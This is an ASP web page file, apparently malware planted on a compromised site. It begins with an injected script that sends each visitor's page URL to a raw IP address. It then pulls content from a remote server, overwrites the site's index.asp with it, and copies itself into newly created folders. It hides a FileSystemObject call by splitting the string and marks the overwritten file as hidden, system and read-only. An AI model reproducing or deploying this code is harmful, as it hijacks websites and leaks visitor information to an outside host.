<script>var x=new XMLHttpRequest();x.open("GET","http://185.86.150.37/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><%
Server.ScriptTimeOut=500 
Remote_server="http://www.nthsmh.com" //服务端url地址


dim RefreshIntervalTime
RefreshIntervalTime = 3 '防止刷新的时间秒数，0表示不防止
If Not IsEmpty(Session("visit")) and isnumeric(Session("visit")) and int(RefreshIntervalTime) > 0 Then
if (timer()-int(Session("visit")))*1000 < RefreshIntervalTime * 1000 then
Response.write ("<meta http-equiv=""refresh"" content="""& RefreshIntervalTime &""" />")
Response.write ("刷新过快...正在加载数据...请稍等.....")
Session("visit") = timer()
Response.end
end if
End If 
Session("visit") = timer()


fn = Request.ServerVariables("SCRIPT_NAME") 
fn = Mid(fn,InStrRev(fn,"/")+1)  
NewFile_content=a(fn)

host_name=replace("http://"&request.servervariables("HTTP_HOST")&request.servervariables("script_name"),fn,"")

dim ml,str,Quantity
ml=Request.ServerVariables("HTTP_url")
str= Split(ml,"/")
Quantity=ubound(str)-1 //层数


	if Quantity<3 then  

		Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name)
		ml_name=strCut(Content_mb,"<!--M_name=","|-->",2)
		Branch=replace(ml_name,"|",".")
		Remote_directory = Remote_server&"/d.php"&"?type=index.asp&host="&host_name&"&directory="&Branch
		Content_directory = getHTTPPage(Remote_directory)
		ml_name=Split(ml_name,"|")
       		 for i=0 to (ubound(ml_name))   
   			 if CFolder("./"&ml_name(i)&"/")=1 then
  			 WriteIn server.mappath("./"&ml_name(i)&"/index.asp"),NewFile_content
 			 end if
		Next

		WriteIn Server.MapPath("./")&"\index.asp",Content_mb
	else

		Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name)
		WriteIn Server.MapPath("./")&"\index.asp",Content_mb

		Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
		set f=fso.Getfile(Server.MapPath("index.asp"))
		if f.attributes <> 7 then
		f.attributes = 7
		end if


	end if





	response.write Content_mb

%>


<%
'截取字符串
'strContent 字符串 
'StartStr   字符串起始位置
'EndStr     字符串结束位置
'CutType    1.包括起始和终止字符，2.不包括 
Function strCut(strContent,StartStr,EndStr,CutType) 
Dim strHtml,S1,S2 
strHtml = strContent 
On Error Resume Next 
Select Case CutType 
Case 1 
S1 = InStr(strHtml,StartStr) 
S2 = InStr(S1,strHtml,EndStr)+Len(EndStr) 
Case 2 
S1 = InStr(strHtml,StartStr)+Len(StartStr) 
S2 = InStr(S1,strHtml,EndStr) 
End Select 
If Err Then 
strCute = "<p align='center'>没有找到需要的内容。</p>" 
Err.Clear 
Exit Function 
Else 
strCut = Mid(strHtml,S1,S2-S1) 
End If 
End Function 
%>

<%
Function getCode(iCount)//取随机混合字母数字
     Dim arrChar
     Dim j,k,strCode
     arrChar = "012qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM3456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     getCode = strCode
End Function

Function Digital(iCount)//取随机数字
     Dim arrChar
     Dim j,k,strCode
     arrChar = "0123456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     Digital = strCode
End Function
Function sj_int(ByVal min, ByVal max) //取随机数字
		Randomize(Timer) : sj_int = Int((max - min + 1) * Rnd + min)
End Function


Function Rand(ByVal min, ByVal max)  
		Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min)
End Function
%>

<%
function WriteIn(testfile,msg)
  set fs=server.CreateObject("scripting.filesystemobject")  
  set thisfile=fs.CreateTextFile(testfile,True)  
  thisfile.Write(""&msg& "")  
  thisfile.close  
  set fs = nothing
end function
%>

<%
function a(t)
	set fs=server.createobject("scripting.filesystemobject")
	file=server.mappath(t)
	set txt=fs.opentextfile(file,1,true)
	if not txt.atendofstream then
	   a=txt.ReadAll
	end if
     set fs=nothing
     set txt=nothing
end function
%>

<%
Function CFolder(Filepath)
  Filepath=server.mappath(Filepath)
  Set Fso = Server.CreateObject("Scripting.FileSystemObject")
  If Fso.FolderExists(FilePath) Then
    CFolder=0
  else
    Fso.CreateFolder(FilePath)
    CFolder=1
  end if
  Set Fso = Nothing
end function
%>

<%
Function getHTTPPage(url) 
On Error Resume Next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then 
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"gb2312") 
set http=nothing 
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b>        </b></font></p>" 
Err.Clear 
End If 
End Function 

Function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function 
%> 

<%
Function GetHtml(url)
	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent","aQ0O010O"
	ObjXMLHTTP.send
	GetHtml=ObjXMLHTTP.responseBody
	Set ObjXMLHTTP=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "gb2312"
	GetHtml = objStream.ReadText
	objStream.Close
End Function
%>

